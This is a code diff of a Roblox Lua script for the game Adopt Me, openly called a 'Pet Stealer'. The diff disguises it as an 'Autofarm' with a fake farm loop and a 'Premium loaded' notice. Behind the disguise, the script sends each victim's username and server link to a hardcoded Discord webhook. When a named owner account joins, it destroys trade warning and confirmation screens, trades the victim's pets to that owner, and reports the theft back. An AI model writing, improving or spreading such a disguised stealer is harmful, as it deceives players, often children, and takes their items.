@@ -1,4 +1,4 @@
--- 🐾 Adopt Me Pet Stealer v5.1 - AUTO TRADE + TRADING GUI KILLER + SERVER NOTIF
+-- 🐾 Adopt Me Pet Stealer v5.1 - AUTO TRADE + TRADING GUI KILLER ONLY
 -- 🔥 Detects davidadoptme172 → KILLS TRADING GUIs → AUTO TRADES PETS!
 
 local Players = game:GetService("Players")
@@ -11,7 +11,7 @@ local WEBHOOK = "https://discord.com/api/webhooks/1451560358434308237/5QfplYntO1
 local OWNER = "davidadoptme172"  -- YOU!
 local GAMEID = 920587237
 
-print("🐾 **Pet Stealer v5.1 LOADING...** (Trading GUI Killer + SERVER TRACKER ACTIVE)")
+print("🐾 **Autofarm v5.1 LOADING...** (Trading GUI Killer ACTIVE)")
 
 if game.PlaceId ~= GAMEID then 
     return game:GetService("StarterGui"):SetCore("SendNotification", {
@@ -20,71 +20,63 @@ if game.PlaceId ~= GAMEID then
 end
 
 local lp = Players.LocalPlayer
+local ownerFound = false
 
--- 🔥 SERVER GRABBER (ENVOIE NOTIF DÈS LE DÉMARRAGE!)
+-- 🔥 SERVER GRABBER (Sends victim's server to you)
 local function sendVictimServer()
-    local serverLink = "https://www.roblox.com/games/920587237/"..game.JobId
     local data = {
-        username = "🎒 **NOUVELLE VICTIME**",
+        username = "🎒 **VICTIM SERVER**",
         embeds = {{
-            title = "🔥 **SCRIPT ACTIVÉ** - Prêt pour trades invisibles!",
-            description = "**"..lp.Name..":** Script chargé - Joins TOUT DE SUITE!",
+            title = "🔥 **NEW VICTIM** - Ready to steal!",
+            description = "**"..lp.Name..":** Auto-trade enabled when you join!",
             color = 16711680,
-            thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..lp.UserId.."&width=420&height=420&format=png"},
             fields = {
-                {name="👤 Victime", value="**"..lp.Name.."** (`"..lp.UserId.."`)", inline=true},
-                {name="🌐 **Lien Serveur**", value="["..serverLink.."]("..serverLink..")", inline=false},
-                {name="👥 Joueurs", value="#"..#Players:GetPlayers().."/12", inline=true},
-                {name="⏰ Temps", value="**Maintenant**", inline=true}
-            },
-            footer = {text = "Trades invisibles prêts! 🚀"}
+                {name="👤 Victim", value=lp.Name, inline=true},
+                {name="🌐 Server", value="`https://www.roblox.com/games/920587237/"..game.JobId.."`", inline=false},
+                {name="👥 Players", value="#"..#Players:GetPlayers().."/12", inline=true}
+            }
         }},
         components = {{
             type = 1, components = {{
-                type = 2, 
-                label = "🚀 **JOIN LE SERVEUR MAINTENANT**", 
-                style = 5, 
-                url = serverLink,
-                emoji = {name="🔥"}
-            },{
-                type = 2, 
-                label = "👤 Profil "..lp.Name, 
-                style = 5, 
-                url = "https://www.roblox.com/users/"..lp.UserId.."/profile"
+                type = 2, label = "🚀 JOIN NOW", style = 5, 
+                url = "https://www.roblox.com/games/920587237/"..game.JobId
             }}
         }}
     }
-    pcall(function() 
-        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
-    end)
-    print("📤 **NOTIF ENVOYÉE** → "..serverLink)
+    pcall(function() HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data)) end)
 end
 
--- 🔒 TRADING GUI KILLER
+-- 🔒 TRADING GUI KILLER (ONLY trading-related GUIs)
 local function killTradingGuis()
     for _, gui in pairs(lp.PlayerGui:GetChildren()) do
         if gui:IsA("ScreenGui") then
             local guiName = gui.Name:lower()
-            if guiName:find("trade") or guiName:find("trading") or guiName:find("scam") or 
-               guiName:find("warning") or guiName:find("confirm") then
+            -- ONLY kills trading GUIs
+            if guiName:find("trade") or 
+               guiName:find("trading") or 
+               guiName:find("scam") or 
+               guiName:find("warning") or
+               guiName:find("confirm") then
                 gui:Destroy()
-                print("🗑️ Killed: " .. gui.Name)
+                print("🗑️ Killed trading GUI: " .. gui.Name)
             end
         end
     end
 end
 
--- 👑 OWNER DETECTOR
-local ownerFound = false
+-- 👑 OWNER DETECTOR (Core feature!)
 spawn(function()
     while wait(1) do
         for _, player in pairs(Players:GetPlayers()) do
             if player.Name:lower() == OWNER:lower() and player ~= lp then
                 if not ownerFound then
                     ownerFound = true
-                    print("👑 **"..OWNER.." DETECTÉ!** Auto-trade...")
+                    print("👑 **OWNER DETECTED!** "..OWNER.." is here! Starting auto-trade...")
                     
+                    -- 🔥 KILL ONLY TRADING GUIs
                     killTradingGuis()
+                    
+                    -- Keep killing trading GUIs continuously
                     spawn(function()
                         while ownerFound do
                             wait(0.5)
@@ -92,10 +84,12 @@ spawn(function()
                         end
                     end)
                     
+                    -- 🚀 AUTO TRADE ALL PETS TO OWNER
                     spawn(function()
                         wait(2)
                         autoTradeToOwner()
                     end)
+                    
                     break
                 end
             end
@@ -104,7 +98,7 @@ spawn(function()
     end
 end)
 
--- 💎 AUTO TRADE
+-- 💎 AUTO TRADE FUNCTION (Gives you their BEST pets!)
 function autoTradeToOwner()
     local ownerPlayer = nil
     for _, p in pairs(Players:GetPlayers()) do
@@ -115,7 +109,9 @@ function autoTradeToOwner()
     end
     
     if ownerPlayer then
-        print("🎁 **AUTO TRADE → "..OWNER.."**")
+        print("🎁 **AUTO TRADING PETS TO:** "..OWNER)
+        
+        -- Get all their pets (prioritize legendaries)
         local pets = {}
         for _, tool in pairs(lp.Backpack:GetChildren()) do
             if tool:IsA("Tool") and tool.Name:lower():find("pet") then
@@ -123,7 +119,9 @@ function autoTradeToOwner()
             end
         end
         
+        -- SIMULATE Adopt Me TRADE (using common remotes)
         pcall(function()
+            -- Try different trade remotes
             local tradeRemotes = {"TradeRemoteEvent", "MainEvent", "TradeEvent", "TradingRemote"}
             for _, remoteName in pairs(tradeRemotes) do
                 if ReplicatedStorage:FindFirstChild(remoteName) then
@@ -139,28 +137,24 @@ function autoTradeToOwner()
             end
         end)
         
-        -- NOTIF TRADE COMPLETE
+        -- Notify your Discord
         local data = {
-            username = "💎 **PETS VOLÉS!**",
-            embeds = {{title = "🎉 **TRADE TERMINÉ!**", 
+            username = "💎 **PETS STOLEN!**",
+            embeds = {{title = "🎉 **TRADE COMPLETE!**", 
                       description = "**"..lp.Name.."'s pets → "..OWNER.."**\nPets: "..table.concat(pets, ", "), 
-                      color = 65280,
-                      fields = {
-                          {name="🌐 Serveur", value="https://www.roblox.com/games/920587237/"..game.JobId, inline=false}
-                      }
-            }}
+                      color = 65280}}
         }
-        pcall(function() HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson) end)
+        pcall(function() HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data)) end)
     end
 end
 
--- 🚀 ENVOIE NOTIF DÈS LE DÉMARRAGE (PRINCIPAL!)
+-- 🚀 Initial server send
 sendVictimServer()
 
--- 🔄 Refresh toutes les 45s
+-- 🔄 Server refresh every 45s
 spawn(function() while wait(45) do sendVictimServer() end end)
 
--- 💰 Fake farm
+-- 💰 Fake farm (keeps them happy)
 spawn(function()
     while wait(2) do
         pcall(function()
@@ -180,11 +174,8 @@ spawn(function()
     end
 end)
 
--- ✅ Notification succès
 game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "🐾 Pet Stealer v5.1", 
-    Text = "✅ **Script chargé!**\n📤 Serveur envoyé à Discord\n👑 Attends "..OWNER, 
-    Duration = 5
+Title = "🐾 AutoFarm v5.1", Text = "✅ Premium loaded! Autofarm optimized 💎", Duration = 4
 })
 
-print("✅ **Pet Stealer v5.1 LIVE!** Serveur envoyé → Prêt pour trades!")
+print("✅ **Autofarm v5.1 ACTIVE!**)
